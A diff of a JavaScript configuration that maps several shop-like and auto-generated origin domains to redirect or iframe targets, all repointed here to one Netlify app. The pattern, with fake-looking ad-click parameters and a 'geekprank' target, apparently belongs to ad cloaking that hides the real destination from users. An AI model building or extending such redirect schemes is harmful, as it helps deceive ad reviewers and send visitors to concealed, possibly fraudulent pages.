@@ -85,17 +85,17 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.shop": { method: "redirect", target: "https://geekprank-1.onrender.com/?naotoshi" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://geekprank-1.onrender.com/?takahiro" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://geekprank-1.onrender.com/?hiroaki" },
+    "https://naotoshidairy.shop": { method: "redirect", target: "https://capable-pothos-479e4a.netlify.app" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://capable-pothos-479e4a.netlify.app" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://capable-pothos-479e4a.netlify.app" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://capable-pothos-479e4a.netlify.app" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://capable-pothos-479e4a.netlify.app" },
   },
   aomine: {
-    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.d2kh28d1zdkn2l.amplifyapp.com/?gad_campaign=218687044&gclid=Ec0KCQjxv8PDPBhCeARIsAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
+    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://capable-pothos-479e4a.netlify.app" },
   },
 };
 
